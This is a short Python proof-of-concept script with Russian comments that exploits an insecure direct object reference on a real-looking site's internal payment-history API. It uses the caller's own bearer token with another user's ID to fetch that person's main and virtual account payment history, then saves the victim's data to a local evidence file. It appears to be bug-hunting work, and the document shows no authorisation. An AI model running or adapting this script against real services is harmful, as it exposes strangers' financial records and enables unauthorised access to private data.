# bug6_poc.py
import requests
import json

BASE = "https://1xlite-03801.world"
MY_TOKEN = input("вставь свой Bearer token: ").strip()
MY_USER_ID = int(input("вставь свой userId: "))
OTHER_USER_ID = int(input("вставь чужой userId (например 67): "))

HEADERS = {
    "Authorization": f"Bearer {MY_TOKEN}",
    "Content-Type": "application/json",
    "Origin": BASE
}

print(f"\nшаг 1: запрашиваю свою историю (userId={MY_USER_ID}) - контроль")
my_r = requests.post(
    BASE + "/web-api/api/internal/v1/account/gethistorypaymentmainaccount",
    json={"userId": MY_USER_ID, "count": 10, "page": 1},
    headers=HEADERS
)
print(f"моя история: {my_r.status_code}")
if my_r.status_code == 200:
    print(f"данные: {my_r.text[:300]}")

print(f"\nшаг 2: запрашиваю историю чужого аккаунта (userId={OTHER_USER_ID})")
other_r = requests.post(
    BASE + "/web-api/api/internal/v1/account/gethistorypaymentmainaccount",
    json={"userId": OTHER_USER_ID, "count": 10, "page": 1},
    headers=HEADERS
)
print(f"чужая история: {other_r.status_code}")
print(f"данные: {other_r.text[:500]}")

if other_r.status_code == 200 and other_r.text.strip() not in ["", "null", "[]"]:
    print(f"\n=== КРИТИЧНО: IDOR подтвержден! ===")
    print(f"токен userId={MY_USER_ID} получил историю userId={OTHER_USER_ID}")

print(f"\nшаг 3: то же самое для виртуального аккаунта")
virt_r = requests.post(
    BASE + "/web-api/api/internal/v1/account/gethistorypaymentvirtualaccount",
    json={"userId": OTHER_USER_ID, "count": 10, "page": 1},
    headers=HEADERS
)
print(f"виртуальный аккаунт чужого: {virt_r.status_code}")
print(f"данные: {virt_r.text[:500]}")

with open("bug6_evidence.json", "w") as f:
    json.dump({
        "my_userId": MY_USER_ID,
        "target_userId": OTHER_USER_ID,
        "my_history_status": my_r.status_code,
        "other_history_status": other_r.status_code,
        "other_history_data": other_r.text,
        "virtual_status": virt_r.status_code,
        "virtual_data": virt_r.text
    }, f, indent=2, ensure_ascii=False)
print("\nсохранено в bug6_evidence.json")
